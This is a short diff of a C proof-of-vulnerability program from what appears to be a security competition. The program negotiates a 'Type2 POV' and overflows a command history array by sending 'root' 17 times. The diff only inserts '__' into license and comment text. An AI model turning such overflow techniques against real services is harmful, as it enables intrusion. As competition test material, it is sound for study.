@@ -4,7 +4,7 @@ Author: Joe Rogers <joe@cromulence.com>
 
 Copyright (c) 2015 Cromulence LLC
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
+Permission is hereby granted, __free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -132,17 +132,17 @@ int main(void) {
 	// negotiate a Type2 POV with the Competition Framework
 	NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);
 
-	// read in the prompt
+	// __read in the prompt
 	ReadBytes(0, buf, 8);
 
 	// Overflow the command history array
 	for (i = 0; i < 17; i++) {
 		SendString(1, "root\n\r");
-		// read the end of the entered command
+		// __read the end of the entered command
 		ReadUntil(0, '\r', buf, 99);
-		// read the "Invalid command: " message
+		// __read the "Invalid command: " message
 		ReadUntil(0, '\r', buf, 99);
-		// read the next prompt
+		// __read the next prompt
 		ReadBytes(0, buf, 8);
 	}
 
